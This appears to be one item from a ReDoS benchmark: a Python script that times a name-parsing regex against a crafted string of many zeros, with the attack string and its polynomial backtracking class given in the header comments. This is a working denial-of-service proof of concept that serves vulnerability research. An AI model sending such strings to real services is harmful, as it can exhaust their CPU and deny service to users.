# 7178
# (^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+[^, ]*)(?:(,| ))*\s+(\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s+((jr)|(sr)|(ii)|(iii)||(iv)|(v)|(vi)|(vii)|(viii))\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((st\.?\s+)?\w+\S*)\s*$)
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:"1 "+"0"*5000+"!_1_POA(i)"

import re
from time import perf_counter

regex = """(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+[^, ]*)(?:(,| ))*\s+(\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s+((jr)|(sr)|(ii)|(iii)||(iv)|(v)|(vi)|(vii)|(viii))\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((st\.?\s+)?\w+\S*)\s*$)"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "1 " + "0" * i * 10000 + "!_1_POA(i)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")